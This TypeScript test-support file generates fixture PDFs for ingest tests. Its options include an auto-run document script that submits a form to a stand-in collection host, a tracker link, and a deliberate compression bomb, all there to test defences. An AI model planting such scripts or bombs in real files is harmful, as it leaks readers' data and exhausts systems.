// Test support of @sebela/memory (`@sebela/memory/testing`): small, deterministic PDF files built
// in memory, so the tests of every package can exercise PDF ingest without binary fixtures. Every
// text they hold is the caller's; nothing here reads a file or the network.
import { constants, deflateRawSync } from "node:zlib";

/** A line of text on a fixture page, in Helvetica at `size` points (11 when absent). */
export interface FixturePdfLine {
  readonly text: string;
  readonly size?: number;
  /** Text whose glyphs map to private-use characters, as a font without usable Unicode would. */
  readonly undecodable?: boolean;
}

/** A fixture page: its lines from the top and, with `image`, a grey picture below them. */
export interface FixturePdfPage {
  readonly lines?: readonly FixturePdfLine[];
  readonly image?: boolean;
}

export interface FixturePdfOptions {
  /** Encrypted with the standard security handler, so a password is needed to open it. */
  readonly encrypted?: boolean;
  /**
   * A document script run on opening and a link to an outside address on the first page: content
   * a reader must treat as data.
   */
  readonly activeContent?: boolean;
  /**
   * Content streams compressed with FlateDecode and text in a Type0 font (Identity-H, two bytes per
   * character) with a ToUnicode map, as a word processor exports it. The text may then be any
   * character up to U+01FF (Czech included); without it, text is latin-1.
   */
  readonly wordProcessor?: boolean;
  /**
   * A compression bomb: the first page's compressed content stream ends with this many spaces,
   * which decompress from a few bytes per kibibyte. Implies compressed content streams.
   */
  readonly inflatedSpaces?: number;
}

/** The latin-1 bytes of a string; fixture text outside latin-1 is refused. */
function latin1(text: string): Uint8Array {
  const bytes = new Uint8Array(text.length);
  for (let index = 0; index < text.length; index += 1) {
    const code = text.charCodeAt(index);
    if (code > 0xff)
      throw new Error(`A fixture PDF holds latin-1 text only, not ${text.charAt(index)}.`);
    bytes[index] = code;
  }
  return bytes;
}

const toUnicode =
  "/CIDInit /ProcSet findresource begin 12 dict begin begincmap /CMapName /Fixture def " +
  "1 begincodespacerange <00> <FF> endcodespacerange 1 beginbfrange <20> <7E> <E000> endbfrange " +
  "endcmap CMapName currentdict /CMap defineresource pop end end";

const stream = (dictionary: string, content: string) =>
  `<< ${dictionary} /Length ${String(content.length)} >>\nstream\n${content}\nendstream`;

/** Maps every two-byte code up to 01FF to the Unicode character of the same number. */
const identityToUnicode =
  "/CIDInit /ProcSet findresource begin 12 dict begin begincmap /CMapName /FixtureIdentity def " +
  "1 begincodespacerange <0000> <FFFF> endcodespacerange " +
  "2 beginbfrange <0000> <00FF> <0000> <0100> <01FF> <0100> endbfrange " +
  "endcmap CMapName currentdict /CMap defineresource pop end end";

const adlerModulus = 65_521n;

/** The Adler-32 sums after `bytes`, from `start`. */
function adlerOf(bytes: Uint8Array, start = { a: 1n, b: 0n }): { a: bigint; b: bigint } {
  let a = Number(start.a);
  let b = Number(start.b);
  for (const byte of bytes) {
    a = (a + byte) % 65_521;
    b = (b + a) % 65_521;
  }
  return { a: BigInt(a), b: BigInt(b) };
}

/** The Adler-32 sums after `count` more bytes of `value`, in closed form. */
function adlerOfRun(start: { a: bigint; b: bigint }, value: number, count: number) {
  const run = BigInt(count);
  const byte = BigInt(value);
  return {
    a: (start.a + byte * run) % adlerModulus,
    b: (start.b + run * start.a + (byte * run * (run + 1n)) / 2n) % adlerModulus,
  };
}

const syncFlush = { finishFlush: constants.Z_SYNC_FLUSH };
const spaceBlockBytes = 1_048_576;
/** Non-final deflate blocks of a mebibyte of spaces, byte aligned, so they can be repeated. */
let spaceBlock: Buffer | undefined;

/** A zlib (FlateDecode) stream of `content` followed by `spaces` spaces, as latin-1 text. */
function flateOf(content: Uint8Array, spaces: number): string {
  spaceBlock ??= deflateRawSync(Buffer.alloc(spaceBlockBytes, 0x20), syncFlush);
  const parts: Buffer[] = [Buffer.from([0x78, 0x9c]), deflateRawSync(content, syncFlush)];
  for (let left = spaces; left > 0; left -= spaceBlockBytes) {
    parts.push(
      left >= spaceBlockBytes ? spaceBlock : deflateRawSync(Buffer.alloc(left, 0x20), syncFlush),
    );
  }
  parts.push(deflateRawSync(Buffer.alloc(0)));
  const { a, b } = adlerOfRun(adlerOf(content), 0x20, spaces);
  const checksum = Buffer.alloc(4);
  checksum.writeUInt32BE(Number((b << 16n) | a));
  parts.push(checksum);
  return Buffer.concat(parts).toString("latin1");
}

/** A line's text as a hex string of two-byte codes, refusing characters beyond U+01FF. */
function identityHexOf(text: string): string {
  let hex = "";
  for (let index = 0; index < text.length; index += 1) {
    // Every character up to U+01FF is one UTF-16 code unit, so code units are enough here.
    const code = text.charCodeAt(index);
    if (code > 0x1ff) throw new Error(`A fixture PDF holds text up to U+01FF, not ${text}.`);
    hex += code.toString(16).padStart(4, "0");
  }
  return hex;
}

/**
 * A PDF of the pages, one text object per line, in WinAnsi-encoded Helvetica (latin-1 text). The
 * same pages always give the same bytes.
 */
export function fixturePdf(
  pages: readonly FixturePdfPage[],
  options: FixturePdfOptions = {},
): Uint8Array {
  const objects: string[] = [];
  const add = (body: string) => objects.push(body);
  const catalog = add("");
  const pageTree = add("");
  const font = add(
    "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>",
  );
  const unicodeMap = add(stream("", toUnicode));
  const undecodableFont = add(
    `<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /ToUnicode ${String(unicodeMap)} 0 R >>`,
  );
  const wordProcessor = options.wordProcessor === true;
  const compressed = wordProcessor || options.inflatedSpaces !== undefined;
  const identityFont = wordProcessor
    ? add(
        "<< /Type /Font /Subtype /Type0 /BaseFont /FixtureSans /Encoding /Identity-H " +
          `/DescendantFonts [${String(objects.length + 2)} 0 R] ` +
          `/ToUnicode ${String(objects.length + 4)} 0 R >>`,
      )
    : 0;
  if (wordProcessor) {
    add(
      "<< /Type /Font /Subtype /CIDFontType2 /BaseFont /FixtureSans " +
        "/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> " +
        `/FontDescriptor ${String(objects.length + 2)} 0 R /DW 500 /CIDToGIDMap /Identity >>`,
    );
    add(
      "<< /Type /FontDescriptor /FontName /FixtureSans /Flags 32 /FontBBox [0 -200 1000 900] " +
        "/ItalicAngle 0 /Ascent 900 /Descent -200 /CapHeight 700 /StemV 80 >>",
    );
    add(stream("", identityToUnicode));
  }
  const image = add(
    stream(
      "/Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceGray /BitsPerComponent 8",
      "\u0080 Àà",
    ),
  );
  const active = options.activeContent === true;
  const script = active
    ? add(
        "<< /Type /Action /S /JavaScript /JS (app.alert\\(1\\); this.submitForm\\({cURL: 'https://collect.example.test/'}\\);) >>",
      )
    : 0;
  const link = active
    ? add(
        "<< /Type /Annot /Subtype /Link /Rect [72 700 300 720] /Border [0 0 0] " +
          "/A << /S /URI /URI (https://tracker.example.test/open) >> >>",
      )
    : 0;
  const kids: number[] = [];
  for (const page of pages) {
    const operators: string[] = [];
    let y = 740;
    for (const line of page.lines ?? []) {
      const size = line.size ?? 11;
      const name = line.undecodable === true ? "F2" : wordProcessor ? "F3" : "F1";
      let shown: string;
      if (wordProcessor && line.undecodable !== true) {
        shown = `<${identityHexOf(line.text)}>`;
      } else {
        const escaped = line.text.replace(/[\\()]/gu, (character) => `\\${character}`);
        latin1(escaped);
        shown = `(${escaped})`;
      }
      operators.push(`BT /${name} ${String(size)} Tf 72 ${String(y)} Td ${shown} Tj ET`);
      y -= Math.round(size * 1.6);
    }
    if (page.image === true) operators.push("q 200 0 0 200 72 72 cm /Im1 Do Q");
    const text = operators.join("\n");
    const content = add(
      compressed
        ? stream(
            "/Filter /FlateDecode",
            flateOf(latin1(text), kids.length === 0 ? (options.inflatedSpaces ?? 0) : 0),
          )
        : stream("", text),
    );
    kids.push(
      add(
        `<< /Type /Page /Parent ${String(pageTree)} 0 R /MediaBox [0 0 612 792] ` +
          `/Resources << /Font << /F1 ${String(font)} 0 R /F2 ${String(undecodableFont)} 0 R` +
          (wordProcessor ? ` /F3 ${String(identityFont)} 0 R` : "") +
          " >> " +
          `/XObject << /Im1 ${String(image)} 0 R >> >> /Contents ${String(content)} 0 R` +
          (active && kids.length === 0 ? ` /Annots [${String(link)} 0 R]` : "") +
          " >>",
      ),
    );
  }
  objects[catalog - 1] =
    `<< /Type /Catalog /Pages ${String(pageTree)} 0 R` +
    (active ? ` /OpenAction ${String(script)} 0 R` : "") +
    " >>";
  objects[pageTree - 1] =
    `<< /Type /Pages /Kids [${kids.map((kid) => `${String(kid)} 0 R`).join(" ")}] ` +
    `/Count ${String(kids.length)} >>`;
  let encryption = "";
  if (options.encrypted === true) {
    // Owner and user entries that no empty password matches.
    const handler = add(
      `<< /Filter /Standard /V 1 /R 2 /O <${"ab".repeat(32)}> /U <${"cd".repeat(32)}> /P -4 >>`,
    );
    const id = "01".repeat(16);
    encryption = ` /Encrypt ${String(handler)} 0 R /ID [<${id}> <${id}>]`;
  }

  let file = "%PDF-1.4\n";
  const offsets: number[] = [];
  objects.forEach((body, index) => {
    offsets.push(file.length);
    file += `${String(index + 1)} 0 obj\n${body}\nendobj\n`;
  });
  const xref = file.length;
  file += `xref\n0 ${String(objects.length + 1)}\n0000000000 65535 f \n`;
  for (const offset of offsets) file += `${String(offset).padStart(10, "0")} 00000 n \n`;
  file +=
    `trailer\n<< /Size ${String(objects.length + 1)} /Root ${String(catalog)} 0 R${encryption} >>\n` +
    `startxref\n${String(xref)}\n%%EOF\n`;
  return latin1(file);
}

/** Bytes that start like a PDF but have no readable structure. */
export function malformedPdf(): Uint8Array {
  return latin1("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 9 0 R\nnot a PDF body\n");
}
